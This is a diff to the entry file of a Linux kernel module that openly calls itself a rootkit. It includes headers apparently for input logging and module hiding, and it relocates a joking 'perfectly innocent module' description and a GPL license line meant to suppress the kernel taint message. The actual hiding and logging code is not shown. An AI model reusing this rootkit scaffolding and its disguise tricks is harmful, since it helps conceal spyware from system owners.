@@ -1,15 +1,25 @@
 #include <linux/module.h>	 // For modules
 #include <linux/kernel.h>	 // For KERN_INFO
 #include <linux/init.h>		 // For init macros
+//#include <linux/tty.h> /* console_print() interface */
+
 
 #include "logInput.h"
 #include "moduleHide.h"
 #include "outputDevice.h"
 
+// Get rid of taint message
+MODULE_LICENSE("GPL");
+MODULE_AUTHOR("Innocent aut");
+MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");
+
 
 static int __init main_init(void) {
+	
+	//panic();
 	int error;
 	
+	// console_print("Hello, world - this is the kernel speaking\n") ;
 	printk(KERN_INFO "Installing rootkit\n");
 
 	error = outputDevice_init();
@@ -42,9 +52,4 @@ static void __exit main_exit(void) {
 
 module_init(main_init);
 module_exit(main_exit);
-
-// Get rid of taint message
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Innocent author");
-MODULE_DESCRIPTION("This is a perfectly innocent module and has nothing to do with rootkits whatsoever :)");
 
